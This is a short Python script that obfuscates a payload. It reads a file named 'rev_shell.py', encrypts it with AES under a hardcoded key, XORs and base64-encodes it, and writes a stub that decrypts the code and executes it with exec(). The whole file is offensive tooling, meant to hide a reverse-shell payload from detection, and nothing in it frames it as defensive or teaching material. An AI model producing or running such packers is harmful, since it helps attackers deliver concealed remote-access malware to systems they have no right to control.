import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

KEY = b'Sixteen byte key'  
BLOCK_SIZE = 16
XOR_KEY = 0x42 

def aes_encrypt(data: str) -> bytes:
    cipher = AES.new(KEY, AES.MODE_CBC, iv=KEY)
    encrypted = cipher.encrypt(pad(data.encode(), BLOCK_SIZE))
    return encrypted

def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def main():
    input_file = "rev_shell.py"
    output_file = "obf_payload.py"

    with open(input_file, "r") as f:
        original_code = f.read()

    
    aes_encrypted = aes_encrypt(original_code)
    
    xor_encrypted = xor_bytes(aes_encrypted, XOR_KEY)
   
    b64_encoded = base64.b64encode(xor_encrypted).decode()

    stub = f'''
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY = b'Sixteen byte key'
BLOCK_SIZE = 16
XOR_KEY = 0x42

def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def aes_decrypt(data: bytes) -> str:
    cipher = AES.new(KEY, AES.MODE_CBC, iv=KEY)
    decrypted = unpad(cipher.decrypt(data), BLOCK_SIZE)
    return decrypted.decode()

encrypted_payload = "{b64_encoded}"


xor_encrypted = base64.b64decode(encrypted_payload)

aes_encrypted = xor_bytes(xor_encrypted, XOR_KEY)

code = aes_decrypt(aes_encrypted)

exec(code)
'''

    with open(output_file, "w") as f:
        f.write(stub)

    print(f"[+] Obfuscated payload saved as: {output_file}")

if __name__ == "__main__":
    main()
